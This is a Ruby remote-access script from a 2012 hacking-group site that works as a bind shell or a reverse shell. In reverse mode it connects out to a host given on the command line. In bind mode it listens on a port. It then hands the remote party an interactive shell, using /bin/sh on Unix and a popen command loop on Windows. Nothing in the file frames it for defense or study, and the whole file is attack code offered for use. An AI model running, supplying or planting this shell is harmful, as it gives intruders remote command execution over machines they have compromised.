#!/usr/bin/env ruby
# devilzc0de.org (c) 2012
#
# bind and reverse shell
# shizuo1337
require 'socket'
require 'pathname'

def usage
	print "bind :\r\n  ruby " + File.basename(__FILE__) + " [port]\r\n"
	print "reverse :\r\n  ruby " + File.basename(__FILE__) + " [port] [host]\r\n"
end

def sucks
	sucks = false
	if RUBY_PLATFORM.downcase.match('mswin|win|mingw')
		sucks = true
	end
	return sucks
end

def realpath(str)
	real = str
	if File.exists?(str)
		d = Pathname.new(str)
		real = d.realpath.to_s
	end
	if sucks
		real = real.gsub(/\//,"\\")
	end
	return real
end

if ARGV.length == 1
	if ARGV[0] =~ /^[0-9]{1,5}$/
		port = Integer(ARGV[0])
	else
		usage
		print "\r\n*** error : Please input a valid port\r\n"
		exit
	end
	server = TCPServer.new("", port)
	s = server.accept
	port = s.peeraddr[1]
	name = s.peeraddr[2]
	s.print "*** connected\r\n"
	puts "*** connected : #{name}:#{port}\r\n"
	begin
		if not sucks
			f = s.to_i
			exec sprintf("/bin/sh -i \<\&%d \>\&%d 2\>\&%d",f,f,f)
		else
			s.print "\r\n" + realpath(".") + ">"
			while line = s.gets
				raise errorBro if line =~ /^die\r?$/
				if not line.chomp == ""
					if line =~ /cd .*/i
						line = line.gsub(/cd /i, '').chomp
						if File.directory?(line)
							line = realpath(line)
							Dir.chdir(line)
						end
						s.print "\r\n" + realpath(".") + ">"
					elsif line =~ /\w:.*/i
						if File.directory?(line.chomp)
							Dir.chdir(line.chomp)
						end
						s.print "\r\n" + realpath(".") + ">"
					else
						IO.popen(line,"r"){|io|s.print io.read + "\r\n" + realpath(".") + ">"}
					end
				end
			end
		end
	rescue errorBro
		puts "*** #{name}:#{port} disconnected"
	ensure
		s.close
		s = nil
	end
elsif ARGV.length == 2
	if ARGV[0] =~ /^[0-9]{1,5}$/
		port = Integer(ARGV[0])
		host = ARGV[1]
	elsif ARGV[1] =~ /^[0-9]{1,5}$/
		port = Integer(ARGV[1])
		host = ARGV[0]
	else
		usage
		print "\r\n*** error : Please input a valid port\r\n"
		exit
	end
	s = TCPSocket.new("#{host}", port)
	port = s.peeraddr[1]
	name = s.peeraddr[2]
	s.print "*** connected\r\n"
	puts "*** connected : #{name}:#{port}"
	begin
		if not sucks
			f = s.to_i
			exec sprintf("/bin/sh -i \<\&%d \>\&%d 2\>\&%d", f, f, f)
		else
			s.print "\r\n" + realpath(".") + ">"
			while line = s.gets
				raise errorBro if line =~ /^die\r?$/
				if not line.chomp == ""
					if line =~ /cd .*/i
						line = line.gsub(/cd /i, '').chomp
						if File.directory?(line)
							line = realpath(line)
							Dir.chdir(line)
						end
						s.print "\r\n" + realpath(".") + ">"
					elsif line =~ /\w:.*/i
						if File.directory?(line.chomp)
							Dir.chdir(line.chomp)
						end
						s.print "\r\n" + realpath(".") + ">"
					else
						IO.popen(line,"r"){|io|s.print io.read + "\r\n" + realpath(".") + ">"}
					end
				end
			end
		end
	rescue errorBro
		puts "*** #{name}:#{port} disconnected"
	ensure
		s.close
		s = nil
	end
else
	usage
	exit
end
